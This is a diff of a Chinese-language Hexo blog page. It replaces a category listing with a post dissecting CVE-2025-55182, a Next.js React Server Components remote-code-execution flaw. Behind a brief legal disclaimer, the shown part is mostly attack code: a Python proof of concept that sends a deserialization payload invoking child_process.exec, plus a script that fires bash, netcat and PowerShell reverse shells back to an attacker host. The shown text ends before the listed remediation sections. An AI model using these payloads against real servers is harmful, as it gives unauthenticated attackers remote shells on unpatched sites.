@@ -1,6 +1,6 @@
 <!doctype html>
 
-<html lang="zh-CN">
+<html lang="zh-CN" data-fancybox-enabled="1">
 <head>
   
 
@@ -8,21 +8,26 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="theme-color" content="#f7f3e9">
 
-<title>分类：AI | ZapcoMan&#39;s world</title>
-<meta name="description" content="分类「AI」收录 2 篇文章，包括旧手机别扔！三台安卓手机搭建本地大模型实战指南、Springboot --- 使用国内的 AI 大模型 对话。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="分类：AI | ZapcoMan&#39;s world">
-<meta property="og:url" content="http://example.com/categories/AI/">
+<title>CVE-2025-55182 POC与反弹Shell——Next.js React Server Components RCE深度剖析 | ZapcoMan&#39;s world</title>
+<meta name="description" content="本文仅供合法授权的安全研究与学习使用，请勿用于非法用途。读者应确保行为符合当地法律法规。 前言React Server Components（RSC）是React 19引入的服务端组件架构，Next.js作为最流行的React框架率先集成。然而，CVE-2025-55182漏洞揭示了RSC在处理Function对象反序列化时的严重安全缺陷。攻击者无需任何认证...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2025-55182 POC与反弹Shell——Next.js React Server Components RCE深度剖析 | ZapcoMan&#39;s world">
+<meta property="og:url" content="http://example.com/2026/07/06/2026070611/">
 <meta property="og:site_name" content="ZapcoMan&#39;s world">
-<meta property="og:description" content="分类「AI」收录 2 篇文章，包括旧手机别扔！三台安卓手机搭建本地大模型实战指南、Springboot --- 使用国内的 AI 大模型 对话。">
+<meta property="og:description" content="本文仅供合法授权的安全研究与学习使用，请勿用于非法用途。读者应确保行为符合当地法律法规。 前言React Server Components（RSC）是React 19引入的服务端组件架构，Next.js作为最流行的React框架率先集成。然而，CVE-2025-55182漏洞揭示了RSC在处理Function对象反序列化时的严重安全缺陷。攻击者无需任何认证...">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-06T02:30:25.000Z">
+<meta property="article:modified_time" content="2026-07-06T02:35:48.553Z">
 <meta property="article:author" content="ZapcoMan">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="POC">
+<meta property="article:tag" content="漏洞利用">
 <meta name="twitter:card" content="summary">
-<link rel="canonical" href="http://example.com/categories/AI/">
+<link rel="canonical" href="http://example.com/2026/07/06/2026070611/">
 
 <link rel="icon" href="https://avatars.githubusercontent.com/u/66863012?s=400&amp;u=12653af0def352c0458bfcf15b96cfa21fcaf518&amp;v=4">
 
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"CollectionPage","headline":"分类：AI | ZapcoMan's world","name":"分类：AI | ZapcoMan's world","description":"分类「AI」收录 2 篇文章，包括旧手机别扔！三台安卓手机搭建本地大模型实战指南、Springboot --- 使用国内的 AI 大模型 对话。","url":"http://example.com/categories/AI/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"ZapcoMan's world","url":"http://example.com/"},"about":"分类：AI"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2025-55182 POC与反弹Shell——Next.js React Server Components RCE深度剖析","name":"CVE-2025-55182 POC与反弹Shell——Next.js React Server Components RCE深度剖析 | ZapcoMan's world","description":"本文仅供合法授权的安全研究与学习使用，请勿用于非法用途。读者应确保行为符合当地法律法规。 前言React Server Components（RSC）是React 19引入的服务端组件架构，Next.js作为最流行的React框架率先集成。然而，CVE-2025-55182漏洞揭示了RSC在处理Function对象反序列化时的严重安全缺陷。攻击者无需任何认证...","url":"http://example.com/2026/07/06/2026070611/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"ZapcoMan's world","url":"http://example.com/"},"mainEntityOfPage":"http://example.com/2026/07/06/2026070611/","datePublished":"2026-07-06T02:30:25.000Z","dateModified":"2026-07-06T02:35:48.553Z","author":{"@type":"Person","name":"ZapcoMan"},"publisher":{"@type":"Organization","name":"ZapcoMan's world"},"keywords":"CVE, POC, 漏洞利用"}</script>
 
 <script>
   (function () {
@@ -56,13 +61,16 @@
   
 
   
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css">
+<script defer src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
+
 
   
 <meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="ZapcoMan's world" type="application/atom+xml">
 </head>
 
 <body
-  class="is-list tag-style-tape bg-style-default"
+  class="is-post tag-style-tape bg-style-default"
   data-default-accent="blue"
   data-code-theme="dark"
   data-note-style="sticky"
@@ -134,7 +142,7 @@
       
     
       
-        <div class="site-nav-item has-children active">
+        <div class="site-nav-item has-children">
           <button class="site-nav-link site-nav-parent" type="button" aria-haspopup="true" aria-expanded="false">
             
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-folder"></use></svg>
@@ -143,7 +151,7 @@
           </button>
           <div class="site-nav-menu" role="menu">
             
-              <a role="menuitem" class="active" href="/categories/">
+              <a role="menuitem" class="" href="/categories/">
                 
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-folder"></use></svg>
 
@@ -219,7 +227,7 @@
 
 
   
-  <main class="paper-shell ">
+  <main class="paper-shell paper-shell--article">
     
 
 <aside id="paper-sidebar-drawer" class="paper-sidebar paper-sidebar--right" aria-label="侧边栏">
@@ -285,8 +293,8 @@
         
       
         
-          <div class="drawer-nav-group is-open active">
-            <button class="drawer-nav-parent" type="button" aria-expanded="true">
+          <div class="drawer-nav-group">
+            <button class="drawer-nav-parent" type="button" aria-expanded="false">
               
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-folder"></use></svg>
 
@@ -294,7 +302,7 @@
             </button>
             <div class="drawer-nav-children">
               
-                <a class="active" href="/categories/">
+                <a class="" href="/categories/">
                   
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-folder"></use></svg>
 
@@ -398,90 +406,28 @@
   
 
   
-    <section class="side-card categories-card">
-      <h2>
-<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-folder"></use></svg>
-分类</h2>
-      
-        <a href="/categories/Java/">
-          <span class="dot dot-0"></span>
-          <strong>Java</strong>
-          <em>6</em>
-        </a>
-      
-        <a href="/categories/Java/Springboot/">
-          <span class="dot dot-1"></span>
-          <strong>Springboot</strong>
-          <em>5</em>
-        </a>
-      
-        <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-          <span class="dot dot-2"></span>
-          <strong>网络安全</strong>
-          <em>21</em>
-        </a>
-      
-        <a href="/categories/python/">
-          <span class="dot dot-3"></span>
-          <strong>python</strong>
-          <em>16</em>
-        </a>
-      
-        <a href="/categories/Java/Springboot/Mybatis/">
-          <span class="dot dot-0"></span>
-          <strong>Mybatis</strong>
-          <em>4</em>
-        </a>
-      
-        <a href="/categories/AI/">
-          <span class="dot dot-1"></span>
-          <strong>AI</strong>
-          <em>2</em>
-        </a>
-      
-    </section>
+    <div class="post-sticky-stack">
+      <section class="side-card toc-card">
+        <header class="toc-card__head">
+          <h2>
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-table-of-contents flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-table-of-contents"></use></svg>
+文章目录</h2>
+          <button type="button" class="toc-toggle-all" data-action="toggle-toc" aria-pressed="false" aria-label="展开全部目录" title="展开全部目录">
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-down flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-chevron-down"></use></svg>
 
-    <section class="side-card tag-card">
-      <header class="tag-card__head">
-        <h2>
-<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-flame flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-flame"></use></svg>
-热门标签</h2>
-        <a class="tag-card__more" href="/tags/">
-          <span>查看全部</span>
+          </button>
+        </header>
+        <div class="toc-content">
           
-<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-arrow-right"></use></svg>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-text">漏洞背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-EXP%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="toc-text">POC&#x2F;EXP实现思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90"><span class="toc-text">核心代码解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E6%A0%B8%E5%BF%83Payload%E6%9E%84%E9%80%A0"><span class="toc-text">POC核心Payload构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Multipart%E8%AF%B7%E6%B1%82%E4%BD%93%E6%9E%84%E9%80%A0"><span class="toc-text">Multipart请求体构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E8%AF%B7%E6%B1%82%E5%8F%91%E9%80%81%E4%B8%8E%E5%93%8D%E5%BA%94%E5%A4%84%E7%90%86"><span class="toc-text">POC请求发送与响应处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9Shell%E5%A4%9A%E5%B9%B3%E5%8F%B0Payload"><span class="toc-text">反弹Shell多平台Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9Shell%E5%8F%91%E9%80%81%E9%80%BB%E8%BE%91"><span class="toc-text">反弹Shell发送逻辑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C"><span class="toc-text">漏洞验证与利用效果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+          
+        </div>
+      </section>
+      
 
-        </a>
-      </header>
-      <div class="tag-cloud">
-        
-        
-          <a class="tag-chip tag-chip-0" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
-        
-          <a class="tag-chip tag-chip-1" href="/tags/python/">python</a>
-        
-          <a class="tag-chip tag-chip-2" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
-        
-          <a class="tag-chip tag-chip-3" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a>
-        
-          <a class="tag-chip tag-chip-4" href="/tags/%E9%9A%8F%E6%89%8B%E8%AE%B0/">随手记</a>
-        
-          <a class="tag-chip tag-chip-5" href="/tags/Java/">Java</a>
-        
-          <a class="tag-chip tag-chip-0" href="/tags/Springboot/">Springboot</a>
-        
-          <a class="tag-chip tag-chip-1" href="/tags/%E7%88%AC%E8%99%AB/">爬虫</a>
-        
-          <a class="tag-chip tag-chip-2" href="/tags/Kali-Linux/">Kali  Linux</a>
-        
-          <a class="tag-chip tag-chip-3" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a>
-        
-          <a class="tag-chip tag-chip-4" href="/tags/Mybatis/">Mybatis</a>
-        
-          <a class="tag-chip tag-chip-5" href="/tags/Vue3/">Vue3</a>
-        
-      </div>
-    </section>
+
+    </div>
   
 
   
@@ -490,427 +436,277 @@
 
     <section class="paper-main">
       
-<section class="archive-paper">
+
+<div class="article-tape-wrap">
+<span class="tape tape--top-right" aria-hidden="true"></span>
+<article class="article-paper">
   
-    <h1>AI</h1>
-  
-  <div class="archive-list">
+  <header class="article-header">
     
-      <a class="archive-item" href="/2026/06/26/2026062625/">
-        <span>2026-06-26</span>
-        <strong>旧手机别扔！三台安卓手机搭建本地大模型实战指南</strong>
-        <em></em>
+      <a class="label-pill" href="/categories/python/">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-folder"></use></svg>
+
+        python
       </a>
     
-      <a class="archive-item" href="/2026/06/26/2026062612/">
-        <span>2026-06-26</span>
-        <strong>Springboot --- 使用国内的 AI 大模型 对话</strong>
-        <em></em>
-      </a>
-    
+    <h1>CVE-2025-55182 POC与反弹Shell——Next.js React Server Components RCE深度剖析</h1>
+    <div class="meta-line meta-line--article">
+      <span class="meta-date">
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-calendar"></use></svg>
+2026-07-06</span>
+      
+        <span class="meta-tags">
+          
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tag flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-tag"></use></svg>
+
+          <a class="meta-tag-link" href="/tags/CVE/">#CVE</a><a class="meta-tag-link" href="/tags/POC/">#POC</a><a class="meta-tag-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">#漏洞利用</a>
+        </span>
+      
+    </div>
+  </header>
+
+  
+
+
+  <div class="article-content">
+    <h1 id=""><a href="#" class="headerlink" title=""></a></h1><blockquote>
+<p>本文仅供合法授权的安全研究与学习使用，请勿用于非法用途。读者应确保行为符合当地法律法规。</p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>React Server Components（RSC）是React 19引入的服务端组件架构，Next.js作为最流行的React框架率先集成。然而，CVE-2025-55182漏洞揭示了RSC在处理Function对象反序列化时的严重安全缺陷。攻击者无需任何认证，仅通过一个POST请求即可在服务器上执行任意命令，甚至直接获取反弹Shell。</p>
+<p>本文基于Blackash-CVE-2025-55182项目源码，分析从概念验证到即时反弹Shell的完整利用过程。</p>
+<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><table>
+<thead>
+<tr>
+<th>属性</th>
+<th>详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE编号</td>
+<td>CVE-2025-55182</td>
+</tr>
+<tr>
+<td>漏洞类型</td>
+<td>远程代码执行（RCE）</td>
+</tr>
+<tr>
+<td>CVSS评分</td>
+<td>9.8（Critical）</td>
+</tr>
+<tr>
+<td>影响版本</td>
+<td>Next.js 14.3.0-canary.77 → 15.0.4 &#x2F; 15.1.8 &#x2F; 16.0.6</td>
+</tr>
+<tr>
+<td>漏洞根因</td>
+<td>React Server Components中Function对象的不安全反序列化</td>
+</tr>
+</tbody></table>
+<p>该漏洞存在于Next.js App Router使用的Flight端点（<code>/_next/static/chunks/react-flight</code>）。当服务器处理POST请求时，会对请求体中的JSON数据进行反序列化。由于RSC协议中<code>__type</code>为<code>Function</code>的对象会被当作函数执行，攻击者可以构造包含<code>child_process.exec</code>调用的Function对象，实现任意命令执行。</p>
+<p>漏洞利用极为简单：无需认证、无需Cookie、单个POST请求即可触发。这使得它成为2025年最危险的前端框架漏洞之一。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li><strong>靶机环境</strong>：Next.js 15.x&#x2F;16.x（未打补丁版本），App Router模式</li>
+<li><strong>攻击环境</strong>：Python 3.x + requests库</li>
+<li><strong>反弹Shell监听</strong>：Netcat（<code>nc -lvnp 4444</code>）</li>
+</ul>
+<h2 id="POC-EXP实现思路"><a href="#POC-EXP实现思路" class="headerlink" title="POC&#x2F;EXP实现思路"></a>POC&#x2F;EXP实现思路</h2><p>项目包含两个工具：</p>
+<ol>
+<li><strong>CVE-2025-55182-POC.py</strong>：概念验证，执行单条命令并查看输出</li>
+<li><strong>CVE-2025-55182-revshell.py</strong>：一键反弹Shell，自动发送三种平台的Payload</li>
+</ol>
+<p>两个工具的核心原理相同——构造包含恶意Function对象的multipart表单数据，通过POST请求发送到Next.js的Flight端点。</p>
+<h2 id="核心代码解析"><a href="#核心代码解析" class="headerlink" title="核心代码解析"></a>核心代码解析</h2><h3 id="POC核心Payload构造"><a href="#POC核心Payload构造" class="headerlink" title="POC核心Payload构造"></a>POC核心Payload构造</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每个Next.js App Router项目使用的默认Flight端点</span></span><br><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/_next/static/chunks/react-flight&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 魔法载荷 – Function对象的不安全反序列化</span></span><br><span class="line">payload = <span class="string">f&#x27;1&#123;&#123;&quot;__type&quot;:&quot;Function&quot;,&quot;code&quot;:&quot;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;<span class="subst">&#123;command&#125;</span>\&#x27;)&quot;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Payload的结构解析：</p>
+<ul>
+<li><strong><code>1</code></strong>：RSC协议的stream标识符</li>
+<li><strong><code>__type: &quot;Function&quot;</code></strong>：告诉RSC反序列化器这是一个Function对象</li>
+<li><strong><code>code</code></strong>：将被执行的JavaScript代码</li>
+</ul>
+<p>代码中<code>global.process.mainModule.require(&#39;child_process&#39;)</code>通过Node.js全局process对象获取<code>child_process</code>模块，然后调用<code>exec()</code>执行用户传入的命令。这种方式绕过了所有模块作用域限制，直接访问Node.js底层API。</p>
+<h3 id="Multipart请求体构造"><a href="#Multipart请求体构造" class="headerlink" title="Multipart请求体构造"></a>Multipart请求体构造</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">boundary = <span class="string">&quot;----WebKitFormBoundaryCVE202555182&quot;</span></span><br><span class="line">body = (</span><br><span class="line">    <span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Content-Disposition: form-data; name=\&quot;0\&quot;\r\n\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;payload&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>--\r\n&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">f&quot;multipart/form-data; boundary=<span class="subst">&#123;boundary&#125;</span>&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (CVE-2025-55182 PoC)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Payload被包装在multipart&#x2F;form-data格式中，字段名为<code>0</code>。Next.js的Server Action处理逻辑会将该字段值作为RSC流进行反序列化，触发Function对象执行。Boundary值中包含<code>CVE202555182</code>作为标识，实际利用时可替换为任意值。</p>
+<h3 id="POC请求发送与响应处理"><a href="#POC请求发送与响应处理" class="headerlink" title="POC请求发送与响应处理"></a>POC请求发送与响应处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.post(url, data=body, headers=headers, timeout=<span class="number">15</span>, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.status_code <span class="keyword">in</span> [<span class="number">200</span>, <span class="number">400</span>, <span class="number">404</span>, <span class="number">500</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 载荷发送成功!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] HTTP <span class="subst">&#123;r.status_code&#125;</span> – 命令应该已在服务器上执行&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(r.text) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(r.text) &lt; <span class="number">1000</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 服务器响应:\n<span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 意外的状态码:&quot;</span>, r.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 请求失败:&quot;</span>, e)</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，200、400、404、500状态码都被视为”发送成功”。这是因为命令执行发生在服务器内部，HTTP响应状态码取决于Next.js如何处理后续逻辑，而非命令是否执行成功。即使返回404，命令也可能已经执行。</p>
+<h3 id="反弹Shell多平台Payload"><a href="#反弹Shell多平台Payload" class="headerlink" title="反弹Shell多平台Payload"></a>反弹Shell多平台Payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payloads = [</span><br><span class="line">    <span class="comment"># Bash反弹shell (最常见，Linux服务器)</span></span><br><span class="line">    <span class="string">f&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="subst">&#123;lhost&#125;</span>/<span class="subst">&#123;lport&#125;</span> 0&gt;&amp;1&#x27;&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Netcat反弹shell (备用方案)</span></span><br><span class="line">    <span class="string">f&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc <span class="subst">&#123;lhost&#125;</span> <span class="subst">&#123;lport&#125;</span> &gt;/tmp/f&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># PowerShell反弹shell (Windows Azure / Windows主机)</span></span><br><span class="line">    <span class="string">f&quot;powershell -nop -c \&quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;<span class="subst">&#123;lhost&#125;</span>&#x27;,<span class="subst">&#123;lport&#125;</span>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;&#123;0&#125;&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;&#125;;$client.Close()\&quot;&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>反弹Shell工具准备了三种Payload，覆盖Linux和Windows平台：</p>
+<ol>
+<li><strong>Bash反弹</strong>：最简洁的Linux反弹方式，利用<code>/dev/tcp</code>伪设备文件建立TCP连接</li>
+<li><strong>Netcat反弹</strong>：通过mkfifo创建命名管道实现双向通信，适用于Bash不可用的环境</li>
+<li><strong>PowerShell反弹</strong>：完整的Windows反弹Shell，创建TCP客户端并循环读取执行命令</li>
+</ol>
+<h3 id="反弹Shell发送逻辑"><a href="#反弹Shell发送逻辑" class="headerlink" title="反弹Shell发送逻辑"></a>反弹Shell发送逻辑</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i, cmd <span class="keyword">in</span> <span class="built_in">enumerate</span>(payloads, <span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 发送载荷 <span class="subst">&#123;i&#125;</span>/3 → &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    evil = <span class="string">f&#x27;1&#123;&#123;&quot;__type&quot;:&quot;Function&quot;,&quot;code&quot;:&quot;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;<span class="subst">&#123;cmd&#125;</span>\&#x27;)&quot;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">    body = (</span><br><span class="line">        <span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Content-Disposition: form-data; name=\&quot;0\&quot;\r\n\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;evil&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>--\r\n&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">f&quot;multipart/form-data; boundary=<span class="subst">&#123;boundary&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (CVE-2025-55182)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url, data=body, headers=headers, timeout=<span class="number">10</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;已发送 (状态码 <span class="subst">&#123;r.status_code&#125;</span>)&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请求超时，请检查目标服务是否正常运行。&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无法连接到目标服务，请确认服务地址和端口是否正确。&quot;</span>)</span><br></pre></td></tr></table></figure>
+
